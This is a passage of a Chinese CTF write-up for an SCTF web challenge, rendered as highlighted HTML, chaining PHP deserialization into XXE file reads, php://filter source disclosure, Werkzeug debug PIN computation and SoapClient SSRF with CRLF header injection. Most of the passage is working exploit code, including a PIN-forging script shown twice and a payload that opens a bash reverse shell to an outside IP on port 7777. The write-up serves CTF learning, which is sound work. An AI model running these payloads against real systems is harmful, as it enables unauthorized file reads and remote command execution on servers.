\"file:///etc/passwd\">\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>x</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&f;\">&amp;f;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>x</span><span class=\"token punctuation\">></span></span> \nEOD;\n//echo $xml;\n$arr=Array(\"properties\"=>Array($xml,2),\"type\"=>\"SimpleXMLElement\");\necho (serialize($arr));\n$obj=new SimpleXMLElement($xml,2);\n//echo $obj;\n?><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><code>&lt;&lt;&lt;EOD</code>是多行字符串的意思，可以理解成python 中的&#96;&#96;&#96;&#96;&#96;</li>\n<li>这个2可以理解成固定的，如果输出$obj，就会运行上面的xml代码，也就是会读出<code>etc/passwd</code>的内容</li>\n</ul>\n<p><img src=\"/../SCTF/16.png\" alt=\"image.png\"></p>\n<p><strong>SplFileObject</strong></p>\n<p><img src=\"/../SCTF/17.png\" alt=\"image.png\"></p>\n<ul>\n<li>第一个参数可以是伪协议，第二个参数是r</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">//echo $xml;</span>\n<span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=/app/app.py\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$arr</span><span class=\"token operator\">=</span><span class=\"token keyword\">Array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"properties\"</span><span class=\"token operator\">=></span><span class=\"token keyword\">Array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"SplFileObject\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/../SCTF/18.png\" alt=\"image.png\"></p>\n<ul>\n<li>解码后得到源码</li>\n</ul>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask\n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'Hello World!'</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"flask开启了debug–-pin码rce\"><a href=\"#flask开启了debug–-pin码rce\" class=\"headerlink\" title=\"flask开启了debug–&gt;pin码rce\"></a>flask开启了debug–&gt;pin码rce</h2><ul>\n<li>正常在本地运行一下环境，之后访问<code>/console</code>，输入正确的Pin码后，可以进入<code>console</code>，执行命令</li>\n<li>那如果我可以控制服务器的<code>console</code>，也就可以rce了</li>\n<li>首先用<code>file_get_contents</code>访问一下console</li>\n</ul>\n<p><img src=\"/../SCTF/19.png\" alt=\"image.png\"></p>\n<ol>\n<li><strong>本地测试</strong></li>\n</ol>\n<ul>\n<li>发现访问时候的参数如下，因为我没法输入命令(都是在burp render看的回显)，所以我只能带着参数去访问</li>\n</ul>\n<p><img src=\"/../SCTF/20.png\" alt=\"image.png\"></p>\n<ul>\n<li>发现是有cookie的</li>\n</ul>\n<p><img src=\"/../SCTF/21.png\" alt=\"image.png\"><br /><strong>那如何带着参数去访问呢？</strong></p>\n<ul>\n<li>那就只能用<code>**SoapClient**</code><strong>，</strong>因为上面有一个<code>object-&gt;sctf</code>，也就是会调用<code>soapclient</code>的call方法，也就是可以携带参数访问了</li>\n</ul>\n<ol start=\"2\">\n<li><strong>flask算pin码</strong></li>\n</ol>\n<ul>\n<li>网上有很多教程，首先我需要确定的是python的版本</li>\n<li>因为它没有报错，所以我不知道路径，只能看运气</li>\n<li>用GlobIterrator类配合glob伪协议去找每个可能一点的目录</li>\n<li>V&amp;N的wp中说用php的GlobIterrator类配合glob伪协议去找每个可能一点的目录，这个目前我还没实现</li>\n<li>我本地的目录是，算pin码的方法在<code>__init__.py</code>中</li>\n</ul>\n<p><img src=\"/../SCTF/22.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里就百度找吧，因为前一天我做了一个<code>ctfshow</code>的flask算pin码的，大致差不多</li>\n<li>也有的wp说访问<code>/usr/lib/python3.8/LICENSE.txt</code>，如果它存在，说明是python3.8</li>\n<li>最后<code>__init__.py</code>的位置在</li>\n</ul>\n<p><code>/usr/lib/python3.8/site-packages/werkzeug/debug/init.py</code></p>\n<p><strong>算pin码的脚本</strong></p>\n<ul>\n<li>直接翻源码</li>\n</ul>\n<details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> getpass\n<span class=\"token keyword\">import</span> hashlib\n<span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">import</span> mimetypes\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> pkgutil\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> typing <span class=\"token keyword\">as</span> t\n<span class=\"token keyword\">import</span> uuid\n<span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> chain\n<span class=\"token keyword\">from</span> os<span class=\"token punctuation\">.</span>path <span class=\"token keyword\">import</span> basename\n<span class=\"token keyword\">from</span> os<span class=\"token punctuation\">.</span>path <span class=\"token keyword\">import</span> join\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pin<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> added salt\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_pin_and_cookie_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n \n    rv <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    num <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    probably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">'app'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'/usr/lib/python3.8/site-packages/flask/app.py'</span>\n    <span class=\"token punctuation\">]</span>\n\n    private_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">'2485378023426'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">#  /sys/class/net/eth0/address 16进制转10进制</span>\n        <span class=\"token comment\">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>\n        <span class=\"token string\">'349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'</span>\n    <span class=\"token punctuation\">]</span>\n\n\n    h <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span>                                        <span class=\"token comment\">#遍历其中的所有元素</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#判断它是否为字符串类型</span>\n            bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"cookiesalt\"</span><span class=\"token punctuation\">)</span>\n\n    cookie_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"__wzd</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">20]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>\n\n    <span class=\"token comment\"># If we need to generate a pin we salt it a bit more so that we don't</span>\n    <span class=\"token comment\"># end up with the same value and generate out 9 digits</span>\n    <span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"pinsalt\"</span><span class=\"token punctuation\">)</span>\n        num <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">09d</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token comment\"># Format the pincode in groups of digits for easier remembering if</span>\n    <span class=\"token comment\"># we don't have a result yet.</span>\n    <span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n                rv <span class=\"token operator\">=</span> <span class=\"token string\">\"-\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>\n                    num<span class=\"token punctuation\">[</span>x <span class=\"token punctuation\">:</span> x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            rv <span class=\"token operator\">=</span> num\n\n    cookie_value <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">|</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hash_pin<span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie_value<span class=\"token punctuation\">)</span>\nget_pin_and_cookie_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p><img src=\"/../SCTF/23.png\" alt=\"image.png\"></p>\n<ul>\n<li>最后这个路径是<code>/usr/lib/python3.8/site-packages/flask/app.py</code>，我在本地输出的是下面这个，也就是找到前半部分，后面直接对应就行了</li>\n</ul>\n<p><img src=\"/../SCTF/24.png\" alt=\"image.png\"></p>\n<ul>\n<li>通过<code>xxe</code>查看信息</li>\n</ul>\n<p><img src=\"/../SCTF/25.png\" alt=\"image.png\"></p>\n<ul>\n<li>查看<code> /sys/class/net/eth0/address</code>，用下面的代码转成10进制</li>\n</ul>\n<p><img src=\"/../SCTF/26.png\" alt=\"image.png\"></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0242ac130002'</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2485378023426</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>下面是获取<code>machine_id</code>的源码，通常</li>\n</ul>\n<p><img src=\"/../SCTF/27.png\" alt=\"image.png\"></p>\n<ul>\n<li>docker没有第一个，只需要把后两个合起来就行了</li>\n</ul>\n<p><code>proc/sys/kernel/random/boot_id </code><br /><code>/proc/self/cgroup</code><br /><img src=\"/../SCTF/28.png\" alt=\"image.png\"></p>\n<ul>\n<li>根据上面的代码，用<code>/</code>分开，且要最后一部分</li>\n</ul>\n<p><img src=\"/../SCTF/29.png\" alt=\"image.png\"></p>\n<ul>\n<li>最后计算<code>pin</code>的脚本，<code>cookie_value</code>的算法参见<code>__int__.py</code>源码</li>\n</ul>\n<details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pin<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> added salt\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_pin_and_cookie_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span>\n \n    rv <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    num <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    probably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">'app'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'/usr/lib/python3.8/site-packages/flask/app.py'</span>\n    <span class=\"token punctuation\">]</span>\n\n    private_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">'2485378023426'</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">#  /sys/class/net/eth0/address 16进制转10进制</span>\n        <span class=\"token comment\">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>\n        <span class=\"token string\">'349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687'</span>\n    <span class=\"token punctuation\">]</span>\n\n\n    h <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#使用 chain 函数可以方便地将多个可迭代对象合并成一个迭代器</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span>                                        <span class=\"token comment\">#遍历其中的所有元素</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#判断它是否为字符串类型</span>\n            bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span>\n    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"cookiesalt\"</span><span class=\"token punctuation\">)</span>\n\n    cookie_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"__wzd</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">20]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span>\n\n    <span class=\"token comment\"># If we need to generate a pin we salt it a bit more so that we don't</span>\n    <span class=\"token comment\"># end up with the same value and generate out 9 digits</span>\n    <span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b\"pinsalt\"</span><span class=\"token punctuation\">)</span>\n        num <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">09d</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token comment\"># Format the pincode in groups of digits for easier remembering if</span>\n    <span class=\"token comment\"># we don't have a result yet.</span>\n    <span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n                rv <span class=\"token operator\">=</span> <span class=\"token string\">\"-\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>\n                    num<span class=\"token punctuation\">[</span>x <span class=\"token punctuation\">:</span> x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            rv <span class=\"token operator\">=</span> num\n\n    cookie_value <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">|</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hash_pin<span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie_value<span class=\"token punctuation\">)</span>\nget_pin_and_cookie_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h2 id=\"soapclient发包，反弹shell\"><a href=\"#soapclient发包，反弹shell\" class=\"headerlink\" title=\"soapclient发包，反弹shell\"></a>soapclient发包，反弹shell</h2><ul>\n<li>这里注意cmd中的参数要url编码，否则会有问题</li>\n<li>vps上开 nc -lvnp 7777,这里如果没有参数n，也会有问题</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.222.155.242%2F7777%20%3C%262%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ua</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"xym4ster\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nCookie: __wzdb2a60e2b19822632a67c=1688531875|11b8517fb9fb\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n    <span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$target</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"aaab\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$arr</span><span class=\"token operator\">=</span><span class=\"token keyword\">Array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"properties\"</span><span class=\"token operator\">=></span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"SimpleXMLElement\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img 